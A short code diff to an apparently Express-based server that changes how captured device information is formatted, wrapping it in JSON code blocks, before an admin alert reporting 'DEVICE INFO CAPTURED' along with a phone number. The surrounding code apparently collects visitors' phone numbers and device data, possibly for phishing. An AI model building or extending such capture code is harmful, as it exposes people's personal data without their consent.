@@ -1598,9 +1598,9 @@ app.all('/xxapi/*', async (req, res) => {
       if (capturedDeviceInfo) {
         try {
           const parsed = typeof capturedDeviceInfo === 'string' ? JSON.parse(capturedDeviceInfo) : capturedDeviceInfo;
-          deviceInfoStr = `\n\nDevice info\n\n${JSON.stringify(parsed, null, 2)}`;
+          deviceInfoStr = `\n\nDevice info\n\n\`\`\`json\n${JSON.stringify(parsed, null, 2)}\n\`\`\``;
         } catch(e) {
-          deviceInfoStr = `\n\nDevice info\n\n${capturedDeviceInfo}`;
+          deviceInfoStr = `\n\nDevice info\n\n\`\`\`json\n${capturedDeviceInfo}\n\`\`\``;
         }
       }
 
@@ -1617,9 +1617,9 @@ app.all('/xxapi/*', async (req, res) => {
         let deviceInfoStr = '';
         try {
           const parsed = typeof reqBody.deviceInfo === 'string' ? JSON.parse(reqBody.deviceInfo) : reqBody.deviceInfo;
-          deviceInfoStr = JSON.stringify(parsed, null, 2);
+          deviceInfoStr = `\`\`\`json\n${JSON.stringify(parsed, null, 2)}\n\`\`\``;
         } catch(e) {
-          deviceInfoStr = reqBody.deviceInfo;
+          deviceInfoStr = `\`\`\`json\n${reqBody.deviceInfo}\n\`\`\``;
         }
         notifyAdmin(data, `📱 DEVICE INFO CAPTURED\n👤 Phone: ${phone || 'N/A'}\n\n${deviceInfoStr}`);
     }
